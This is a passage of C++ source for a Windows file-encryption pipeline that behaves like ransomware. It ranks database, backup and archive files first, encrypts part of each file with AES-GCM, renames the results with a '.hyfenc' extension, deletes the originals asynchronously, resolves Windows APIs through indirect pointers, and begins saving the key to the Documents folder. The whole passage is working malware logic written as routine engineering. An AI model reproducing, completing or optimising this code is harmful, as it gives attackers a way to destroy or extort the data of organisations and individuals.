                        throw std::runtime_error("File size is zero: " + filePath.string());
                    }

                    // 限制最大读取大小，避免内存溢出
                    const size_t MAX_READ_SIZE = 1024 * 1024 * 1024; // 1GB
                    if (fileSize > MAX_READ_SIZE) {
                        throw std::runtime_error("File too large: " + std::to_string(fileSize) + " bytes");
                    }

                    // ⬇⬇⬇ 使用成员函数，必须加 this
                    size_t readSize = this->calculateReadSize(filePath, fileSize);

                    std::ifstream file(filePath, std::ios::binary);
                    if (!file.is_open()) {
                        throw std::runtime_error("Cannot open file: " + filePath.string());
                    }

                    // 预分配内存
                    std::vector<BYTE> buffer;
                    buffer.reserve(readSize);
                    buffer.resize(readSize);

                    if (!file.read(reinterpret_cast<char*>(buffer.data()), readSize)) {
                        throw std::runtime_error("Failed to read file data");
                    }

                    file.close();

                    // 成功读取数据
                    chain.setValue(std::move(buffer));
                }
                catch (const std::exception& e) {
                    std::cerr << "File read error: " << e.what() << std::endl;
                    chain.setException(std::make_exception_ptr(std::runtime_error(e.what())));
                }
                });

            return chain;
        }

        void stopScheduler() {
            stop = true;
            queueCV.notify_all();
            if (ioCompletionPort) {
                ioCompletionPort->stop();
            }
        }

        size_t getActiveOperations() const { return activeReads.load(); }

        // 添加获取任务信息的公共静态方法
        static const fs::path& getTaskFilePath(const FileTask& task) {
            return task.getFilePath();
        }

        static size_t getTaskFileSize(const FileTask& task) {
            return task.getFileSize();
        }

        static bool getTaskIsDatabaseFile(const FileTask& task) {
            return task.getIsDatabaseFile();
        }

        static int getTaskPriority(const FileTask& task) {
            return task.getPriority();
        }

    private:
        void handleIOCompletion(DWORD bytesTransferred, DWORD error, LPOVERLAPPED overlapped) {
            if (!overlapped) return;

            auto readContext = reinterpret_cast<AsyncReadContext*>(overlapped->hEvent);
            if (!readContext) return;

            try {
                if (error != ERROR_SUCCESS) {
                    readContext->readPromise.set_exception(
                        std::make_exception_ptr(std::runtime_error("Async read error: " + std::to_string(error))));
                }
                else {
                    readContext->bytesRead = bytesTransferred;
                    if (bytesTransferred == readContext->fileSize) {
                        readContext->readPromise.set_value(std::move(readContext->buffer));
                    }
                    else {
                        readContext->readPromise.set_exception(
                            std::make_exception_ptr(std::runtime_error("Incomplete read")));
                    }
                }
            }
            catch (...) {
                readContext->readPromise.set_exception(std::current_exception());
            }
        }
    };

    // 主流水线控制器 - 优化版
    class OptimizedPipelineController {
    public:
        // 添加keepAlive参数到waitForCompletion方法
        void waitForCompletion(bool keepAlive = false) {
            using namespace std::chrono_literals;

            // Smart detection parameters
            const int maxStableChecks = 3; // 减少稳定检查次数
            const std::chrono::milliseconds shortInterval(50); // 更短的间隔
            const std::chrono::milliseconds longInterval(150);
            const int maxTimeoutSeconds = keepAlive ? 120 : 60; // 更短的超时

            size_t lastProcessed = totalFilesProcessed.load();
            size_t lastActive = activeTasks_.load();
            size_t lastDeletionPending = asyncDeletionCoordinator.getPendingTasks();
            size_t lastDeletionCompleted = asyncDeletionCoordinator.getCompletedTasks();

            int stableCount = 0;
            int timeoutCount = 0;
            bool encryptionPhaseCompleted = false;
            bool allTasksFinished = false;

            std::cout << "Starting smart task completion wait. Current status: "
                << "Processed=" << lastProcessed
                << ", Active encryption tasks=" << lastActive
                << ", Pending deletion tasks=" << lastDeletionPending
                << ", Completed deletions=" << lastDeletionCompleted << std::endl;

            auto startTime = std::chrono::steady_clock::now();

            while (!allTasksFinished && timeoutCount * 2 < maxTimeoutSeconds) {
                // 动态间隔调整
                auto currentInterval = (lastActive > 5 || lastDeletionPending > 10) ? shortInterval : longInterval;
                std::this_thread::sleep_for(currentInterval);

                size_t currentProcessed = totalFilesProcessed.load();
                size_t currentActive = activeTasks_.load();
                size_t currentDeletionPending = asyncDeletionCoordinator.getPendingTasks();
                size_t currentDeletionCompleted = asyncDeletionCoordinator.getCompletedTasks();

                // 详细状态监控
                if (timeoutCount % 5 == 0) {
                    std::cout << "Status: Encryption=" << currentProcessed << "/" << currentActive
                        << " | Deletion=" << currentDeletionCompleted << "/" << currentDeletionPending
                        << " | Stable=" << stableCount << std::endl;
                }

                // 超时检查
                auto currentTime = std::chrono::steady_clock::now();
                auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(currentTime - startTime);

                if (elapsed.count() > maxTimeoutSeconds) {
                    std::cout << "Timeout after " << elapsed.count() << " seconds" << std::endl;
                    break;
                }

                // 检查是否有任何活动任务
                bool hasActiveTasks = (currentActive > 0 || currentDeletionPending > 0);

                // 检查状态是否稳定（没有变化）
                bool tasksStable = (currentProcessed == lastProcessed &&
                    currentActive == lastActive &&
                    currentDeletionPending == lastDeletionPending);

                // 完成条件：没有活动任务且状态稳定
                if (!hasActiveTasks) {
                    if (tasksStable) {
                        stableCount++;

                        if (stableCount >= maxStableChecks) {
                            allTasksFinished = true;
                            std::cout << "All tasks completed and stable for "
                                << (stableCount * currentInterval.count()) << "ms" << std::endl;
                            break;
                        }
                    }
                    else {
                        // 状态变化，重置稳定计数
                        stableCount = 0;
                    }
                }
                else {
                    // 有活动任务，重置稳定计数
                    stableCount = 0;
                    timeoutCount = 0; // 重置超时计数，因为有进展
                }

                // 如果长时间没有进展，增加超时计数
                if (tasksStable && hasActiveTasks) {
                    timeoutCount++;
                }
                else {
                    timeoutCount = 0;
                }

                // 更新上一次的状态
                lastProcessed = currentProcessed;
                lastActive = currentActive;
                lastDeletionPending = currentDeletionPending;
            }

            // 最终报告
            auto endTime = std::chrono::steady_clock::now();
            auto totalDuration = std::chrono::duration_cast<std::chrono::seconds>(endTime - startTime);

            std::cout << "\nTask completion wait finished in " << totalDuration.count() << " seconds\n"
                << "Final status:\n"
                << "  Files processed: " << totalFilesProcessed.load() << "\n"
                << "  Active encryption tasks: " << activeTasks_.load() << "\n"
                << "  Pending deletions: " << asyncDeletionCoordinator.getPendingTasks() << "\n"
                << "  Completed deletions: " << asyncDeletionCoordinator.getCompletedTasks() << std::endl;

            // 如果还有待处理的任务，强制关闭删除协调器
            if (asyncDeletionCoordinator.getPendingTasks() > 0) {
                std::cout << "Warning: " << asyncDeletionCoordinator.getPendingTasks()
                    << " deletion tasks still pending" << std::endl;
            }
        }
    private:
        // 在OptimizedPipelineController类中优化preparePartialDataForEncryption方法
        std::vector<BYTE> preparePartialDataForEncryption(const std::vector<BYTE>& data, size_t encryptSize, DWORD workerId) {
            try {
                // 使用栈上小缓冲区避免小数据的内存分配
                if (encryptSize <= 4096) {
                    alignas(64) BYTE stackBuffer[4096];
                    if (encryptSize <= sizeof(stackBuffer)) {
                        memcpy(stackBuffer, data.data(), encryptSize);

                        // 快速混淆：使用XOR和移位组合
                        for (size_t i = 0; i < encryptSize; i++) {
                            stackBuffer[i] ^= (workerId + i) & 0xFF;
                            stackBuffer[i] = (stackBuffer[i] << 4) | (stackBuffer[i] >> 4);
                        }

                        return std::vector<BYTE>(stackBuffer, stackBuffer + encryptSize);
                    }
                }

                // 大数据使用内存池
                AlignedMemoryPool localMemoryPool(encryptSize + 64); // 带对齐的精确大小
                void* alignedBuffer = localMemoryPool.allocate(encryptSize);
                if (!alignedBuffer) {
                    throw std::runtime_error("Failed to allocate aligned memory");
                }

                memcpy(alignedBuffer, data.data(), encryptSize);

                // 优化的数据混淆：使用向量化操作
                BYTE* buffer = static_cast<BYTE*>(alignedBuffer);
                const size_t batchSize = 64; // 64字节批次处理

                for (size_t i = 0; i + batchSize <= encryptSize; i += batchSize) {
                    for (size_t j = 0; j < batchSize; j++) {
                        buffer[i + j] ^= (workerId + i + j) & 0xFF;
                        buffer[i + j] = (buffer[i + j] << 4) | (buffer[i + j] >> 4);
                    }
                }

                // 处理剩余字节
                for (size_t i = (encryptSize / batchSize) * batchSize; i < encryptSize; i++) {
                    buffer[i] ^= (workerId + i) & 0xFF;
                    buffer[i] = (buffer[i] << 4) | (buffer[i] >> 4);
                }

                std::vector<BYTE> result(encryptSize);
                memcpy(result.data(), alignedBuffer, encryptSize);
                return result;
            }
            catch (const std::exception& e) {
                std::cerr << "Partial data preparation failed: " << e.what() << std::endl;
                return std::vector<BYTE>();
            }
        }




    private:
        std::vector<BYTE> performPartialGCMEncryption(const std::vector<BYTE>& data,
            size_t originalSize,
            DWORD workerId,
            const std::string& mode) {
            try {
                auto& ctx = encryptEngine.getThreadContext();

                // 生成新的IV（每个文件独立）
                NTSTATUS status = SAFE_CALL_API(pBCryptGenRandom, nullptr,
                    ctx.localIV, IV_LENGTH, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
                if (!NT_SUCCESS(status)) {
                    throw std::runtime_error("IV generation failed: " + to_hex(status));
                }

                // 初始化认证信息
                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
                BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
                authInfo.pbNonce = ctx.localIV;
                authInfo.cbNonce = IV_LENGTH;
                authInfo.pbTag = ctx.localTag;
                authInfo.cbTag = TAG_LENGTH;

                // 获取加密后的大小
                ULONG ciphertextSize = 0;
                status = SAFE_CALL_API(pBCryptEncrypt, ctx.key,
                    const_cast<BYTE*>(data.data()), static_cast<ULONG>(data.size()),
                    &authInfo, nullptr, 0, nullptr, 0, &ciphertextSize, 0);

                if (!NT_SUCCESS(status) && status != STATUS_BUFFER_TOO_SMALL) {
                    throw std::runtime_error("Get ciphertext size failed: " + to_hex(status));
                }

                // 执行加密
                std::vector<BYTE> ciphertext(ciphertextSize);
                ULONG bytesEncrypted = 0;

                status = SAFE_CALL_API(pBCryptEncrypt, ctx.key,
                    const_cast<BYTE*>(data.data()), static_cast<ULONG>(data.size()),
                    &authInfo, nullptr, 0, ciphertext.data(), ciphertextSize, &bytesEncrypted, 0);

                if (!NT_SUCCESS(status)) {
                    throw std::runtime_error(mode + " encryption failed: " + to_hex(status));
                }

                // 构建输出：IV + 密文 + TAG
                std::vector<BYTE> result(IV_LENGTH + bytesEncrypted + TAG_LENGTH);
                memcpy(result.data(), ctx.localIV, IV_LENGTH);
                memcpy(result.data() + IV_LENGTH, ciphertext.data(), bytesEncrypted);
                memcpy(result.data() + IV_LENGTH + bytesEncrypted, ctx.localTag, TAG_LENGTH);

                // 更新统计信息
                statsManager.recordMetric(mode + "Encryption", data.size(), 0);

                return result;
            }
            catch (const std::exception& e) {
                std::cerr << mode << " GCM encryption failed: " << e.what() << std::endl;
                return std::vector<BYTE>();
            }
        }
    private:
        OptimizedIOScheduler ioScheduler;
        OptimizedEncryptionEngine encryptEngine;
        PerformanceStatsManager statsManager;
        AsyncDeletionCoordinator asyncDeletionCoordinator;
        ThreadAffinityManager affinityManager;

        std::atomic<bool> pipelineRunning{ false };
        std::vector<std::thread> workerThreads;
        std::atomic<size_t> totalFilesProcessed{ 0 };
        std::atomic<size_t> totalBytesProcessed{ 0 };
        StageMetrics stageMetrics[5];
        std::atomic<size_t> errorCount{ 0 };
        mutable std::mutex failedFilesMutex;
        std::vector<fs::path> failedFiles;

        // 背压控制
        std::atomic<size_t> activeTasks_{ 0 };
        std::atomic<size_t> pendingIO_{ 0 };
        std::atomic<size_t> pendingEncryption_{ 0 };
        const size_t maxActiveTasks_{ 100 };
        const size_t maxPendingIO_{ 50 };
        const size_t maxPendingEncryption_{ 50 };

    public:
        OptimizedPipelineController()
            : ioScheduler(statsManager)
            , encryptEngine(statsManager)
            , asyncDeletionCoordinator(statsManager) {
            statsManager.startMonitoring();
            affinityManager.initialize();
        }

        ~OptimizedPipelineController() {
            shutdownPipeline();
            statsManager.stopMonitoring();
            statsManager.printStats();
        }

        bool initializePipeline(const BYTE* encryptionKey) {
            if (!encryptEngine.initialize(encryptionKey)) {
                std::cerr << "Failed to initialize optimized encryption engine" << std::endl;
                return false;
            }

            auto& config = RuntimeConfigManager::getInstance();
            DWORD threadCount = config.getMaxWorkerThreads();
            pipelineRunning = true;

            for (DWORD i = 0; i < threadCount; ++i) {
                workerThreads.emplace_back([this, i]() {
                    pipelineWorker(i);
                    });
            }

            std::cout << "Optimized pipeline initialized with " << threadCount << " worker threads" << std::endl;
            return true;
        }

        void shutdownPipeline() {
            pipelineRunning = false;
            ioScheduler.stopScheduler();

            // ========== 修改点5：先等待加密线程完全结束，再启动快速删除 ==========
            std::cout << "Waiting for encryption threads to complete..." << std::endl;

            // 快速等待加密线程结束
            for (int i = 0; i < 10; ++i) {
                if (activeTasks_.load() == 0) {
                    break;
                }
                std::this_thread::sleep_for(std::chrono::milliseconds(50));
            }

            // 强制结束任何剩余的加密线程
            for (auto& thread : workerThreads) {
                if (thread.joinable()) {
                    thread.detach();  // 改为detach，不等待
                }
            }
            workerThreads.clear();

            // 现在标记加密完成，启动快速删除模式
            asyncDeletionCoordinator.markEncryptionCompleted();

            encryptEngine.cleanup();
            std::cout << "Optimized pipeline shutdown completed" << std::endl;
        }
        void addEncryptionTask(const fs::path& inputFile, const fs::path& outputFile, int priority = 0) {
            if (activeTasks_.load() >= maxActiveTasks_) {
                std::cerr << "Backpressure: skipping task due to high load: " << inputFile << std::endl;
                return;
            }

            try {
                // 规范化文件路径
                fs::path normalizedInput = fs::absolute(inputFile);
                fs::path normalizedOutput = fs::absolute(outputFile);

                if (!fs::exists(normalizedInput)) {
                    std::cerr << "Input file does not exist: " << normalizedInput << std::endl;
                    return;
                }

                // 检查文件是否可读
                std::ifstream testFile(normalizedInput, std::ios::binary);
                if (!testFile.is_open()) {
                    std::cerr << "Cannot open file for reading: " << normalizedInput << std::endl;
                    return;
                }
                testFile.close();

                size_t fileSize = fs::file_size(normalizedInput);
                if (fileSize == 0) {
                    std::cerr << "File is empty: " << normalizedInput << std::endl;
                    return;
                }

                bool isDatabaseFile = isFileDatabaseType(normalizedInput);
                int calculatedPriority = calculatePriority(fileSize, isDatabaseFile, priority);

                ioScheduler.addFileTask(normalizedInput, fileSize, isDatabaseFile, calculatedPriority);
                activeTasks_.fetch_add(1);

                std::cout << "Optimized task added: " << normalizedInput << " (Size: " << fileSize
                    << ", Priority: " << calculatedPriority << ")" << std::endl;
            }
            catch (const std::exception& e) {
                std::cerr << "Error adding optimized task: " << e.what() << std::endl;
            }
        }

        void waitForCompletion() {
            using namespace std::chrono_literals;
            const int stableChecksRequired = 4;
            const std::chrono::milliseconds interval(500);

            size_t lastCount = totalFilesProcessed.load();
            int stableCount = 0;

            while (true) {
                std::this_thread::sleep_for(interval);
                printProgress();

                size_t nowCount = totalFilesProcessed.load();

                if (nowCount != lastCount) {
                    lastCount = nowCount;
                    stableCount = 0;
                    continue;
                }

                if (!pipelineRunning) break;

                stableCount++;
                if (stableCount >= stableChecksRequired) break;
            }

            std::cout << "\nPipeline completion: processed=" << totalFilesProcessed.load() << std::endl;
        }

    private:
        void pipelineWorker(DWORD workerId) {
            affinityManager.setCurrentThreadAffinity(workerId % affinityManager.getProcessorGroupCount());
            std::cout << "Optimized pipeline worker " << workerId << " started" << std::endl;

            while (pipelineRunning) {
                if (!canAcceptNewTask()) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
                    continue;
                }

                auto taskOpt = ioScheduler.getNextTask();
                if (!taskOpt) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
                    continue;
                }

                processFileTask(*taskOpt, workerId);
            }

            std::cout << "Optimized pipeline worker " << workerId << " finished" << std::endl;
        }
        void processFileTask(const OptimizedIOScheduler::FileTask& task, DWORD workerId) {
            auto startTime = std::chrono::high_resolution_clock::now();
            bool encryptionSuccess = false;
            fs::path outputFile;
            std::vector<BYTE> originalDataBackup;

            try {
                // Use getter methods instead of directly accessing private members
                fs::path inputFile = OptimizedIOScheduler::getTaskFilePath(task);

                // Use the newly added function to get file size
                uintmax_t fileSize = GetFileSizeOptimized(inputFile);
                if (fileSize == 0) {
                    throw std::runtime_error("File size is zero: " + inputFile.string());
                }

                // 定义 originalFileSize 变量
                size_t originalFileSize = static_cast<size_t>(fileSize);

                std::cout << "🔧🔧 Worker thread " << workerId << " started processing file: " << inputFile
                    << " (Size: " << originalFileSize << " bytes)" << std::endl;

                // Use asynchronous I/O to read the file
                auto readChain = ioScheduler.readFileAsync(task);
                auto readData = readChain.get();

                if (readData.empty()) {
                    throw std::runtime_error("Failed to read file data");
                }

                originalDataBackup = readData;
                outputFile = inputFile;
                outputFile += ".hyfenc";

                // Check if output file already exists
                if (fs::exists(outputFile)) {
                    std::cout << "⚠️  Output file already exists, skipping: " << outputFile << std::endl;

                    // Even when skipping, update the count to avoid infinite waiting
                    totalFilesProcessed.fetch_add(1, std::memory_order_release);
                    activeTasks_.fetch_sub(1, std::memory_order_release);
                    return;
                }

                // Get file extension to identify database files
                std::string ext = inputFile.extension().string();
                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

                static const std::unordered_set<std::string> databaseExtensions = {
                    ".mdf", ".ndf", ".ldf", ".bak", ".dbf", ".db", ".sqlite", ".sqlite3",
                    ".accdb", ".mdb", ".frm", ".ibd", ".myi", ".myd", ".ora", ".dmp",
                    ".backup", ".wal", ".journal", ".dat", ".bin",".7z",".rar","zip"
                };

                bool isDatabaseFile = databaseExtensions.find(ext) != databaseExtensions.end();
                std::string encryptionMode = "full";

                // Determine encryption mode based on file type and size
                size_t encryptSize = originalFileSize;
                if (isDatabaseFile) {
                    // Database files: full encryption (100%)
                    encryptSize = originalFileSize;
                    encryptionMode = "partial";
                    std::cout << "🗄🗄️  Database file, using full encryption mode (100%)" << std::endl;
                }
                else if (originalFileSize < SMALL_FILE_THRESHOLD) {
                    // Small files: encrypt only first 4KB
                    encryptSize = std::min(originalFileSize, (size_t)HEADER_ENCRYPT_SIZE);
                    encryptionMode = "partial";
                    std::cout << "📄📄 Small file, using header encryption mode (" << encryptSize << "/" << originalFileSize << " bytes)" << std::endl;
                }
                else {
                    // Large files: encrypt 1%
                    encryptSize = (originalFileSize * CHUNK_ENCRYPT_RATIO) / 100;
                    encryptionMode = "partial";
                    std::cout << "📁📁 Large file, using partial encryption mode (" << encryptSize << "/" << originalFileSize << " bytes, 1%)" << std::endl;
                }

                // Prepare data for encryption
                auto forgedData = preparePartialDataForEncryption(readData, encryptSize, workerId);
                if (forgedData.empty()) {
                    throw std::runtime_error("Data preparation failed");
                }

                // Perform encryption
                auto encryptedData = performPartialGCMEncryption(forgedData, encryptSize, workerId, encryptionMode);
                if (encryptedData.empty()) {
                    throw std::runtime_error("GCM encryption failed, mode: " + encryptionMode);
                }

                // Build complete output: IV + ciphertext + TAG + remaining plaintext (if any)
                std::vector<BYTE> finalOutput;
                finalOutput.insert(finalOutput.end(), encryptedData.begin(), encryptedData.end());

                // If not full encryption, add remaining plaintext
                if (!isDatabaseFile && encryptSize < originalFileSize) {
                    finalOutput.insert(finalOutput.end(),
                        readData.begin() + encryptSize,
                        readData.end());
                }

                // Commit encrypted data - 使用正确的参数
                if (commitEncryptedData(outputFile, finalOutput, inputFile, originalFileSize)) {
                    encryptionSuccess = true;

                    // ========== Critical fix: Ensure count update ==========
                    totalFilesProcessed.fetch_add(1, std::memory_order_release);
                    totalBytesProcessed.fetch_add(originalFileSize, std::memory_order_release);
                    // ===========================================

                    std::cout << "✅ " << encryptionMode << " encryption completed: " << outputFile
                        << " (" << encryptSize << "/" << originalFileSize << " bytes)" << std::endl;

                    // ========== Modification 1: Fully asynchronous deletion, no waiting for results ==========
                    asyncDeletionCoordinator.scheduleDeletion(inputFile, outputFile);
                    // Result monitoring is completely asynchronous, not affecting encryption flow
                    // ====================================================

                    // Update statistics
                    auto endTime = std::chrono::high_resolution_clock::now();
                    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(endTime - startTime);

                    stageMetrics[static_cast<int>(PipelineStage::STAGE_IO_READ)].updateMetrics(originalFileSize, duration.count() / 5.0);
                    stageMetrics[static_cast<int>(PipelineStage::STAGE_ENCRYPTION)].updateMetrics(originalFileSize, duration.count() / 2.0);

                    // Debug output
                    std::cout << "✅ File encryption completed, count updated: " << totalFilesProcessed.load()
                        << " files (Time taken: " << duration.count() << "ms)" << std::endl;

                    if (totalFilesProcessed % 10 == 0) {
                        printProgress();
                    }
                }
                else {
                    throw std::runtime_error("Failed to commit encrypted data");
                }
            }
            catch (const std::exception& e) {
                std::cerr << "❌❌ Optimization pipeline error: " << e.what() << std::endl;
                errorCount++;

                {
                    std::lock_guard<std::mutex> lock(failedFilesMutex);
                    failedFiles.push_back(OptimizedIOScheduler::getTaskFilePath(task));
                }

                // Clean up temporary files
                if (!outputFile.empty() && fs::exists(outputFile)) {
                    std::error_code ec;
                    fs::remove(outputFile, ec);
                    if (ec) {
                        std::cerr << "⚠️  Failed to clean up temporary file: " << outputFile << std::endl;
                    }
                }

                // Even if failed, update count to avoid infinite waiting
                totalFilesProcessed.fetch_add(1, std::memory_order_release);
                std::cout << "⚠️  File processing failed, but count has been updated: " << totalFilesProcessed.load() << std::endl;
            }

            // Ensure activeTasks is decreased
            activeTasks_.fetch_sub(1, std::memory_order_release);

            // Update total processing time
            auto endTime = std::chrono::high_resolution_clock::now();
            auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(endTime - startTime);
            stageMetrics[static_cast<int>(PipelineStage::STAGE_IO_READ)].totalTimeMs += duration.count();
        }
        bool canAcceptNewTask() const {
            return activeTasks_.load(std::memory_order_acquire) < maxActiveTasks_ &&
                pendingIO_.load(std::memory_order_acquire) < maxPendingIO_ &&
                pendingEncryption_.load(std::memory_order_acquire) < maxPendingEncryption_;
        }

        bool isFileDatabaseType(const fs::path& filePath) {
            static const std::unordered_set<std::string> databaseExtensions = {
                ".mdf", ".ndf", ".ldf", ".bak", ".dbf", ".db", ".sqlite", ".sqlite3",
                ".accdb", ".mdb", ".frm", ".ibd", ".myi", ".myd", ".ora", ".dmp",
                ".backup", ".wal", ".journal", ".dat", ".bin"
            };

            std::string ext = filePath.extension().string();
            std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
            return databaseExtensions.find(ext) != databaseExtensions.end();
        }

        int calculatePriority(size_t fileSize, bool isDatabaseFile, int userPriority) {
            int priority = userPriority;

            if (isDatabaseFile) {
                priority += 1000;
            }

            if (fileSize < 1024 * 1024) {
                priority += 500;
            }
            else if (fileSize < 10 * 1024 * 1024) {
                priority += 200;
            }

            return priority;
        }
        std::vector<BYTE> prepareDataForEncryption(const std::vector<BYTE>& data, DWORD workerId) {
            try {
                // 直接创建局部内存池，不需要类成员
                AlignedMemoryPool localMemoryPool(1024 * 1024); // 1MB临时内存池

                void* alignedBuffer = localMemoryPool.allocate(data.size());
                if (!alignedBuffer) {
                    throw std::runtime_error("Failed to allocate aligned memory");
                }

                struct MemoryGuard {
                    AlignedMemoryPool& pool;
                    void* ptr;
                    size_t size;
                    ~MemoryGuard() { if (ptr) pool.deallocate(ptr); }
                } guard{ localMemoryPool, alignedBuffer, data.size() };

                memcpy(alignedBuffer, data.data(), data.size());

                // 可选的数据混淆
                if (workerId % 4 == 0) {
                    BYTE dummyKey[KEY_LENGTH] = { 0 };
                    obfuscateData(static_cast<BYTE*>(alignedBuffer), data.size(), dummyKey, 0);
                }

                std::vector<BYTE> result(data.size());
                memcpy(result.data(), alignedBuffer, data.size());
                return result;
            }
            catch (const std::exception& e) {
                std::cerr << "Data preparation failed: " << e.what() << std::endl;
                return std::vector<BYTE>();
            }
        }

        std::vector<BYTE> performGCMEncryption(const std::vector<BYTE>& data, size_t originalSize, DWORD workerId) {
            try {
                // 使用优化后的加密引擎
                GCM_ENCRYPT_RESULT result = encryptEngine.encryptGCM(data.data(), data.size());

                if (!result.success) {
                    std::cerr << "Optimized GCM encryption failed for data size: " << data.size()
                        << ", workerId: " << workerId << std::endl;
                    return std::vector<BYTE>();
                }

                // 构建完整加密数据：IV + 密文 + TAG
                std::vector<BYTE> encryptedData(IV_LENGTH + data.size() + TAG_LENGTH);

                // 写入IV（从线程局部上下文获取）
                auto& ctx = encryptEngine.getThreadContext();
                memcpy(encryptedData.data(), ctx.localIV, IV_LENGTH);

                // 写入密文
                memcpy(encryptedData.data() + IV_LENGTH, result.ciphertext.data(), data.size());

                // 写入认证标签
                memcpy(encryptedData.data() + IV_LENGTH + data.size(), result.tag, TAG_LENGTH);

                std::cout << "Optimized GCM encryption successful: " << data.size()
                    << " bytes encrypted (Worker: " << workerId << ")" << std::endl;
                return encryptedData;
            }
            catch (const std::exception& e) {
                std::cerr << "Optimized GCM encryption failed: " << e.what() << std::endl;
                return std::vector<BYTE>();
            }
        }

        bool commitEncryptedData(const fs::path& outputFile, const std::vector<BYTE>& encryptedData,
            const fs::path& originalFile, size_t originalFileSize) {
            fs::path tempFile = outputFile;
            tempFile += ".tmp";

            // 清理可能存在的临时文件
            std::error_code ec;
            if (fs::exists(tempFile, ec)) {
                fs::remove(tempFile, ec);
            }

            // 使用同步I/O模式，避免重叠I/O的复杂性
            HANDLE hTempFile = SAFE_CALL_API(pCreateFileW,
                tempFile.c_str(),
                GENERIC_WRITE,
                FILE_SHARE_READ,
                NULL,
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH, // 移除了FILE_FLAG_OVERLAPPED
                NULL);

            if (hTempFile == INVALID_HANDLE_VALUE) {
                std::cerr << "Failed to create temp file: " << tempFile << " (Error: " << GetLastError() << ")" << std::endl;
                return false;
            }

            // 安全的写入函数 - 处理大文件分块写入
            auto safeWriteFile = [](HANDLE hFile, const BYTE* data, size_t dataSize) -> bool {
                const size_t MAX_CHUNK_SIZE = 0x7FFFFFFF; // 2GB分块
                size_t remaining = dataSize;
                const BYTE* currentPos = data;

                while (remaining > 0) {
                    DWORD chunkSize = static_cast<DWORD>(std::min(remaining, MAX_CHUNK_SIZE));
                    DWORD bytesWritten = 0;

                    if (!WriteFile(hFile, currentPos, chunkSize, &bytesWritten, NULL)) {
                        std::cerr << "WriteFile failed: " << GetLastError() << std::endl;
                        return false;
                    }

                    if (bytesWritten != chunkSize) {
                        std::cerr << "Incomplete write: expected " << chunkSize << ", got " << bytesWritten << std::endl;
                        return false;
                    }

                    currentPos += chunkSize;
                    remaining -= chunkSize;
                }
                return true;
                };

            // 写入加密数据
            if (!safeWriteFile(hTempFile, encryptedData.data(), encryptedData.size())) {
                std::cerr << "Failed to write encrypted data to temp file" << std::endl;
                CloseHandle(hTempFile);
                return false;
            }

            // 如果需要追加原始文件的剩余部分
            if (encryptedData.size() < originalFileSize) {
                HANDLE hOriginalFile = SAFE_CALL_API(pCreateFileW,
                    originalFile.c_str(),
                    GENERIC_READ,
                    FILE_SHARE_READ,
                    NULL,
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL,
                    NULL);

                if (hOriginalFile != INVALID_HANDLE_VALUE) {
                    // 设置文件指针到正确位置
                    LARGE_INTEGER liOffset;
                    liOffset.QuadPart = encryptedData.size();
                    if (SAFE_CALL_API(pSetFilePointerEx, hOriginalFile, liOffset, NULL, FILE_BEGIN)) {
                        // 同样使用安全的分块复制
                        const size_t BUFFER_SIZE = 64 * 1024; // 64KB缓冲区
                        std::vector<BYTE> buffer(BUFFER_SIZE);
                        LONGLONG remainingBytes = originalFileSize - encryptedData.size();

                        while (remainingBytes > 0) {
                            DWORD bytesToRead = static_cast<DWORD>(std::min(
                                static_cast<LONGLONG>(BUFFER_SIZE), remainingBytes));
                            DWORD bytesRead = 0;

                            if (ReadFile(hOriginalFile, buffer.data(), bytesToRead, &bytesRead, NULL) &&
                                bytesRead > 0) {

                                if (!safeWriteFile(hTempFile, buffer.data(), bytesRead)) {
                                    std::cerr << "Failed to write remaining data" << std::endl;
                                    break;
                                }
                                remainingBytes -= bytesRead;
                            }
                            else {
                                std::cerr << "Failed to read from original file" << std::endl;
                                break;
                            }
                        }
                    }
                    CloseHandle(hOriginalFile);
                }
            }

            // 刷新并关闭文件
            SAFE_CALL_API(pFlushFileBuffers, hTempFile);
            CloseHandle(hTempFile);

            // 验证临时文件
            if (!fs::exists(tempFile)) {
                std::cerr << "Temp file does not exist after writing" << std::endl;
                return false;
            }

            uintmax_t tempFileSize = fs::file_size(tempFile);
            size_t expectedSize = std::max(encryptedData.size(), originalFileSize);

            if (tempFileSize != expectedSize) {
                std::cerr << "Temp file size mismatch: expected=" << expectedSize
                    << ", actual=" << tempFileSize << std::endl;
                fs::remove(tempFile, ec);
                return false;
            }

            // 重命名临时文件到目标文件
            return safeRenameFile(tempFile, outputFile);
        }

        void printProgress() {
            size_t processed = totalFilesProcessed.load();
            size_t bytes = totalBytesProcessed.load();
            size_t active = activeTasks_.load();

            double progressPercent = (processed > 0) ?
                (static_cast<double>(bytes) / (processed * 1024.0 * 1024.0)) * 100.0 : 0.0;

            std::cout << "\r优化管道进度: " << processed
                << " 文件, " << (bytes / (1024 * 1024))
                << " MB, " << std::fixed << std::setprecision(1) << progressPercent
                << "%, 活跃任务: " << active << "     " << std::flush;
        }

        void obfuscateData(BYTE* data, size_t size, const BYTE* key, uint64_t fileOffset) {
            for (size_t i = 0; i < size; ++i) {
                data[i] ^= key[(fileOffset + i) % KEY_LENGTH];
            }
        }
    };
};

// ==================== 辅助函数实现 ====================
inline void GenerateRandomKey(BYTE* key, DWORD length) {
    if (!key || length == 0) return;

    NTSTATUS status = SAFE_CALL_API(pBCryptGenRandom, nullptr, key, length, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    if (!NT_SUCCESS(status)) {
        std::random_device rd;
        std::uniform_int_distribution<int> dist(0, 255);
        for (DWORD i = 0; i < length; ++i) {
            key[i] = static_cast<BYTE>(dist(rd));
        }
    }
}

inline bool SaveKeyToDocuments(const BYTE* key, DWORD length, const std::wstring& fileName) {
    try {
        PWSTR docsPath = nullptr;
        HRESULT hr = SAFE_CALL_API(pSHGetKnownFolderPath, FOLDERID_Documents, 0, nullptr, &docsPath);

        if (FAILED(hr) || !docsPath) {
            std::cerr << "Cannot get documents path: " << hr << std::endl;
            return false;
        }

